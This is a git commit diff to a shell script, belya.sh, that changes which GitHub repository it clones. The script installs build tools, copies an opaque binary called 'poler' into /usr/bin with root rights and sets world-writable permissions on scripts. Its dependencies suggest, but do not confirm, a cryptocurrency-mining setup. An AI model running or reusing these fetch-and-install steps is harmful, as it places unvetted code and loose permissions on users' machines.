beb00e0a55ecebd1616ba5fe3d6307c89505b6ef
burkabest <52100051+burkabest@users.noreply.github.com>
2019-07-14 23:53:07 +0300

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -8,11 +8,11 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir myfirstss
-git clone https://github.com/burkabest/myfirstss.git /tmp/myfirstss
-cd /tmp/myfirstss
-chmod +x /tmp/myfirstss/poler
+git clone https://github.com/burkabest/myfirstss3.git /tmp/myfirstss3
+cd /tmp/myfirstss3
+chmod +x /tmp/myfirstss3/poler
 chmod 777 ./*.sh
-cp /tmp/myfirstss/poler /usr/bin/
+cp /tmp/myfirstss3/poler /usr/bin/
 
 sudo apt-get install dos2unix
 sudo dos2unix time1.sh
